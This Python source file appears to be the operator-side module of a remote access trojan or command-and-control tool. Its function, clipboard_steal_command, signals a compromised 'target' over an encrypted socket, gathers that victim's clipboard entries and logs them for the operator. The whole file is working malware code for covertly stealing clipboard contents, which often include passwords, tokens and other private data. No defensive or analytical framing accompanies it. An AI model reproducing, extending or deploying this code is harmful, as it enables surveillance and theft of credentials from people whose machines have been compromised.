"""Utility functions for capturing clipboard data from the client."""

from components.networking import (
    decrypt_message,
    encrypt_message,
    clear_socket_buffer,
)
from components.logging import log_activity
from termcolor import colored
import socket
import time

def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket, key: bytes) -> str:
    """Handle the clipboard stealing routine.

    Parameters
    ----------
    client_output: bytes
        Initial message from the client signalling the clipboard listener
        has started on their side.
    conn_obj: socket.socket
        Active socket connection with the client.

    Returns
    -------
    str
        Aggregated clipboard data or an error message.
    """

    received_data = []

    decrypted_client_message = decrypt_message(client_output, key)  # Signal message
    if decrypted_client_message.decode() != "STARTED":
        return colored("[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.", "red")

    original_timeout = conn_obj.gettimeout()
    # Use a short timeout while waiting for clipboard data
    conn_obj.settimeout(0.5)
    print(
        f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
    )
    
    try:
        # Wait until the operator interrupts the loop with CTRL+C
        while True:
            input("Press Ctrl+C to stop and receive clipboard data: ")
    except KeyboardInterrupt:
        conn_obj.sendall(encrypt_message("END", key))
        print(
            f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
        )
        print()  # Clear any input clutter

    # Attempt to receive any buffered clipboard entries after the interrupt
    try:
        while True:
            try:
                output = decrypt_message(conn_obj.recv(4096), key)
                if output:
                    decoded_output = output.strip().decode() 
                    received_data.extend(decoded_output.split("\n"))
                else:
                    break
            except socket.timeout:
                break
    except Exception as e:
        print(f"[-] Error when trying to gather clipboard data: {e}")

    try:
        if not received_data:
            log_activity(f"No clipboard entries have been gathered.", "info")
        
            return "[-] No clipboard data gathered from target"
        else:
            print("Loading clipboard data . . .")
            print("Gathered clipboard data :")
            # Reorganise output
            result, counter = [], 0
            for data in received_data:
                counter += 1
                if data:
                    result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))

            # Report gathered entries
            log_activity(f"Gathered {len(result)} clipboard entries.", "info")
            
            return "\n".join(result) 
    finally:
        # Ensure socket state is restored for subsequent commands
        conn_obj.settimeout(original_timeout)
        clear_socket_buffer(conn_obj)
